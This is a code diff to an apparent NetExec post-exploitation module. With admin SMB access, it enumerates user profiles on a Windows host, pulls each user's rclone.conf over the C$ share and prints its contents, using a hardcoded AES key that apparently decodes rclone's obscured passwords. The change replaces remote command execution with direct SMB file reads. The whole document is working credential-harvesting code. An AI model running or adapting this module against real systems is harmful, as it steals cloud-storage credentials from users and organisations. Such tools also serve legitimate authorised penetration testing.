@@ -1,5 +1,6 @@
 import base64
 from Crypto.Cipher import AES
+from io import BytesIO
 
 SECRET_KEY = b"\x9c\x93\x5b\x48\x73\x0a\x55\x4d\x6b\xfd\x7c\x63\xc8\x86\xa9\x2b\xd3\x90\x19\x8e\xb8\x12\x8a\xfb\xf4\xde\x16\x2b\x8b\x95\xf6\x38"
 
@@ -24,63 +25,53 @@ class NXCModule:
     privilege = True
 
     def options(self, context, module_options):
-        """There are no module options."""
+        """No module options."""
 
-    def on_login(self, context, connection):
-        try:
-            output = connection.execute("dir C:\\", True, methods=["smbexec"])
-        except Exception as e:
-            context.log.error(f"Failed to list C:\\: {e}")
-            return False
-
-        if not output:
-            context.log.error("No output from dir C:\\")
-            return False
-
-        use_legacy = any("Documents and Settings" in line for line in output.splitlines())
-
-        base_path = (
-            '"C:\\Documents and Settings\\"' if use_legacy else "C:\\Users"
-        )
+    def on_admin_login(self, context, connection):
+        self.share = "C$"
+        base_dir = "\\Users"
+        skip_dirs = {"Public", "Default", "Default User", "All Users"}
 
         try:
-            user_list_output = connection.execute(f"dir {base_path}", True, methods=["smbexec"])
+            entries = connection.conn.listPath(self.share, base_dir + "\\*")
         except Exception as e:
-            context.log.error(f"Failed to list {base_path}: {e}")
+            context.log.error(f"Failed to list {base_dir}: {e}")
             return False
 
-        usernames = self.parse_user_dirs(user_list_output)
+        usernames = [
+            entry.get_longname()
+            for entry in entries
+            if entry.is_directory() and entry.get_longname() not in skip_dirs | {".", ".."}
+        ]
+
         if not usernames:
             context.log.warning("No user directories found.")
             return False
 
         for username in usernames:
-            if use_legacy:
-                rclone_path = f'"C:\\Documents and Settings\\{username}\\.config\\rclone\\rclone.conf"'
-            else:
-                rclone_path = f"C:\\Users\\{username}\\AppData\\Roaming\\rclone\\rclone.conf"
-
-            context.log.info(f"Trying to read: {rclone_path}")
+            conf_path = f"\\Users\\{username}\\AppData\\Roaming\\rclone\\rclone.conf"
+            context.log.info(f"Trying to read: {self.share + conf_path}")
+            conf_data = ""
 
             try:
-                file_output = connection.execute(f"type {rclone_path}", True, methods=["smbexec"])
-            except Exception as e:
-                context.log.debug(f"[{username}] Failed to read {rclone_path}: {e}")
-                continue
-
-            if not file_output or "The system cannot find the" in file_output:
+                buf = BytesIO()
+                connection.conn.getFile(self.share, conf_path, buf.write)
+                conf_data = buf.getvalue().decode()
+            except Exception:
                 context.log.info(f"[{username}] rclone.conf not found.")
                 continue
 
-            decoded = file_output
-
-            if "RCLONE_ENCRYPT_V0" in decoded:
+            if "RCLONE_ENCRYPT_V0" in conf_data:
                 context.log.fail(f"[{username}] Encrypted config — skipping.")
                 continue
 
             context.log.success(f"[{username}] rclone.conf found!")
 
-            for line in decoded.splitlines():
+            for line in conf_data.splitlines():
+                line = line.strip()
+                if not line:
+                    continue
+                
                 if "=" not in line:
                     context.log.highlight(line.strip())
                     continue
@@ -96,20 +87,3 @@ class NXCModule:
                     context.log.highlight(line.strip())
 
         return True
-
-    def parse_user_dirs(self, output):
-        usernames = []
-        skip_dirs = {"Public", "Default", "Default User", "All Users"}
-
-        for line in output.splitlines():
-            parts = line.split()
-            if len(parts) < 5:
-                continue
-
-            folder_name = parts[-1]
-            if folder_name in skip_dirs or folder_name in [".", ".."]:
-                continue
-
-            usernames.append(folder_name)
-
-        return usernames
